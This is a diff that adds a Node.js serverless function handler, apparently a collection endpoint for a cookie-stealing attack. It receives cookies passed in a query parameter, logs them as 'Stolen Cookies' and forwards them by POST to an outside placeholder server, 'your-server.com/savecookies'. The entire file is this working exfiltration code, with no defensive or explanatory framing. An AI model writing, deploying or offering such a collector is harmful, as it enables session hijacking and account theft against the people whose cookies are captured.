@@ -1,0 +1,19 @@
+const fetch = require('node-fetch');
+
+exports.handler = async function (event, context) {
+    const cookies = event.queryStringParameters.cookies;
+    console.log('Stolen Cookies:', cookies);
+    // You can save the cookies to a database or file here
+    // For example, send the cookies to another server
+    await fetch('https://your-server.com/savecookies', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ cookies }),
+    });
+    return {
+        statusCode: 200,
+        body: 'Cookies received',
+    };
+};
